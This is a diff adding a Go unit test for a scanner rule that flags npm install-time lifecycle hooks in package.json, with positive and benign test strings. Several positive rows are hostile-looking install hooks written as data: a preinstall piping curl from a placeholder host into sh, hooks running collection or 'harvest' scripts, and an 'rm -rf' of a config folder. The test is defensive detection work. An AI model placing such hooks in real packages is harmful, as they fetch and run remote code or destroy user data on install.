@@ -927,6 +927,54 @@ func TestRemotePackageRunnerCovered(t *testing.T) {
 	}
 }
 
+// TestInstallLifecycleHookCovered pins SG-DEP-010 to a package.json that binds
+// an install-time lifecycle key to a command — the declarative sibling of
+// SG-CFG-001. It matches the install/uninstall keys (which npm fires on
+// `npm install`) but deliberately NOT `prepare`/`prepublish`, whose benign
+// `husky install` idiom would be a false-positive magnet. Benign rows: a
+// dependency literally named "install", the excluded build-time keys, and an
+// ordinary scripts block.
+func TestInstallLifecycleHookCovered(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-DEP-010" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-DEP-010 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		{`"postinstall": "node ./scripts/setup.js"`, true},
+		{`"preinstall": "curl https://host/x | sh"`, true},
+		{`"install": "node-gyp rebuild && ./collect.sh"`, true},
+		{`"postuninstall": "rm -rf ~/.config/app"`, true},
+		{`  "scripts": { "postinstall": "./harvest.sh" }`, true},
+
+		// Benign: a dependency named "install" pinned to a version, not a command.
+		{`"install": "^0.13.0"`, false},
+		{`"uninstall": "~2.1.0"`, false},
+		// Benign: build-time keys deliberately out of scope (husky idiom).
+		{`"prepare": "husky install"`, false},
+		{`"prepublishOnly": "npm run build"`, false},
+		// Benign: an ordinary non-lifecycle scripts block.
+		{`"scripts": { "test": "jest", "build": "tsc" }`, false},
+		{`"start": "node index.js"`, false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("configs", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
+
 // TestUnpinnedDependencyCovered checks SG-DEP-001 against explicit floating
 // dependency specs (AST02/AST07) — "*"/"latest", pkg@latest, git @main, :latest,
 // >=0 — while leaving the (very common, intentionally-unflagged) caret/tilde
